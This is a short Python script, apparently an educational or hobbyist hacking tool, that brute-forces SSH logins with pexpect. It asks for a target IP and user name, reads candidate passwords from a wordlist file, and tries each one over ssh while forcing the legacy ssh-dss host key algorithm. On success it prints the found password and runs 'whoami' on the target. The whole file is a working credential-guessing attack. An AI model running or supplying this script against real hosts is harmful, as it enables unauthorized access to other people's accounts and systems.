import pexpect
from termcolor import colored


PROMPT = ['# ','>>> ','> ','\s ']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkeyMessage = 'Are you sure you want to continue connecting?'
    connStr = 'ssh -oHostKeyAlgorithms=+ssh-dss ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkeyMessage, '[P|p|assword: ]'])
    if ret == 0:
        print('[-] Error Connection')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p|assword: ]'])
        if ret == 0:
            print('[-] Error connection')
            return
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)    
    return child

def main():
    host = input("Enter IP Address of Target To Bruteforce: ")
    user = input("Enter User Account You Want To Bruteforce: ")
    file = open("passwords.txt","r")
    for password in file.readlines():
        try:
            child = connect(user, host, password)
            print(colored("[+] Password Found: " + password, 'green'))
            #whoami = Cabeçalho "quem sou eu"
            send_command(child, "whoami")
        except:
            print(colored("[-] Wrong Password "+ password, 'red'))


main()
